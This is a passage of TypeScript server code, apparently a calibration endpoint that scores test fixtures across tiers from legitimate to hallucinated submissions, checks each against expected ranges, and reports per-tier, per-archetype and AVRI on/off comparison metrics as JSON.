        engine2Score: e2 ?? 50,
        strongEvidenceCount: e2Strength,
        verificationRatio,
      },
    );

    const compositeOk = composite >= f.expectedComposite[0] && composite <= f.expectedComposite[1];
    const e2Ok = e2 != null && e2 >= f.expectedEngine2[0] && e2 <= f.expectedEngine2[1];
    const triageOk = f.expectedTriage.includes(triage.action as TriageAction);
    const passed = compositeOk && e2Ok && triageOk;

    return {
      id: f.id, tier: f.tier,
      archetype: f.archetype ?? null,
      composite, e1, e2, e3,
      triage: triage.action,
      verification: {
        referenced: referencedChecks.length,
        fallback: (verification?.checks ?? []).filter((c: { source?: string }) => c.source === "search_fallback").length,
        verified: refVerified,
        notFound: refNotFound,
        score: verification?.score ?? null,
      },
      expectedComposite: f.expectedComposite,
      expectedEngine2: f.expectedEngine2,
      expectedTriage: f.expectedTriage,
      compositeOk, e2Ok, triageOk, passed,
    };
  }));

  const tiers: Tier[] = ["T1_LEGIT", "T2_BORDERLINE", "T3_SLOP", "T4_HALLUCINATED"];
  const summary = tiers.map(tier => {
    const subset = results.filter(r => r.tier === tier);
    const composites = subset.map(r => r.composite);
    const e2s = subset.map(r => r.e2 ?? 0);
    const mean = composites.reduce((a, b) => a + b, 0) / Math.max(1, composites.length);
    const e2Mean = e2s.reduce((a, b) => a + b, 0) / Math.max(1, e2s.length);
    const min = Math.min(...composites);
    const max = Math.max(...composites);
    const passRate = subset.filter(r => r.passed).length / Math.max(1, subset.length);
    return {
      tier, count: subset.length,
      compositeMean: Number(mean.toFixed(1)),
      compositeMin: min, compositeMax: max,
      engine2Mean: Number(e2Mean.toFixed(1)),
      passRate: Number(passRate.toFixed(2)),
    };
  });

  // v3.6.0 success metric: T1 mean - T3 mean ≥ 25 AND every fixture passes.
  const t1Mean = summary.find(s => s.tier === "T1_LEGIT")?.compositeMean ?? 0;
  const t3Mean = summary.find(s => s.tier === "T3_SLOP")?.compositeMean ?? 0;
  const gap = Number((t1Mean - t3Mean).toFixed(1));
  const allFixturesPassed = results.every(r => r.passed);

  // Sprint 11 (AVRI Part 13) — calibration comparison: per-family means and
  // T1−T3 composite gap with AVRI on vs off. AVRI off must keep ≥25pt gap;
  // AVRI on must reach ≥50pt gap.
  const avriOnRows = runFixturesWithMode(FIXTURES, true);
  const avriOffRows = runFixturesWithMode(FIXTURES, false);
  const avriOn = summarizeMode(avriOnRows);
  const avriOff = summarizeMode(avriOffRows);
  const perFixture = avriOnRows.map((on, i) => {
    const off = avriOffRows[i]!;
    return {
      id: on.id,
      tier: on.tier,
      family: on.family,
      onScore: on.composite,
      offScore: off.composite,
      delta: Number((on.composite - off.composite).toFixed(1)),
    };
  });
  const avriComparison = {
    on: avriOn,
    off: avriOff,
    gapDelta: Number((avriOn.gap - avriOff.gap).toFixed(1)),
    targets: {
      avriOnGap: 50,
      avriOffGap: 25,
    },
    avriOnGapMeetsTarget: avriOn.gap >= 50,
    avriOffGapMeetsTarget: avriOff.gap >= 25,
    perFixture,
  };

  // Sprint 12 — group per-fixture results by their reviewer-facing archetype
  // label so calibration can monitor each emerging slop "shape" at a glance.
  // Each archetype reports its members' live composite, the AVRI-on/off
  // composites from the comparison sweep, and the distance to the
  // LIKELY-INVALID ceiling (composite 35) under AVRI-on — that distance is
  // the regression headroom before a fixture would escape auto-rejection.
  const LIKELY_INVALID_CEILING = 35;
  const onById = new Map(perFixture.map(p => [p.id, p]));
  const archetypeIds = Array.from(
    new Set(results.map(r => r.archetype).filter((a): a is string => !!a)),
  ).sort();
  const archetypes = archetypeIds.map(archetype => {
    const subset = results.filter(r => r.archetype === archetype);
    const fixtures = subset.map(r => {
      const cmp = onById.get(r.id);
      const onScore = cmp?.onScore ?? r.composite;
      const offScore = cmp?.offScore ?? null;
      return {
        id: r.id,
        tier: r.tier,
        composite: r.composite,
        avriOnScore: onScore,
        avriOffScore: offScore,
        distanceToCeiling: Number((LIKELY_INVALID_CEILING - onScore).toFixed(1)),
        triage: r.triage,
        passed: r.passed,
      };
    });
    const onScores = fixtures.map(f => f.avriOnScore);
    const meanOn = onScores.reduce((a, b) => a + b, 0) / Math.max(1, onScores.length);
    const maxOn = onScores.length ? Math.max(...onScores) : 0;
    return {
      archetype,
      count: fixtures.length,
      avriOnMean: Number(meanOn.toFixed(1)),
      avriOnMax: Number(maxOn.toFixed(1)),
      minDistanceToCeiling: Number((LIKELY_INVALID_CEILING - maxOn).toFixed(1)),
      ceiling: LIKELY_INVALID_CEILING,
      fixtures,
    };
  });

  res.json({
    fixtureCount: FIXTURES.length,
    passed: allFixturesPassed && gap >= 25,
    results,
    summary,
    archetypes,
    successMetrics: {
      legitMean: t1Mean,
      slopMean: t3Mean,
      gap,
      gapMeetsTarget: gap >= 25,
      allFixturesPassed,
      target: ">= 25pt gap between T1_LEGIT and T3_SLOP composite means; every fixture must pass its composite + Engine 2 + triage assertions",
    },
    avriComparison,
  });
});

export default router;
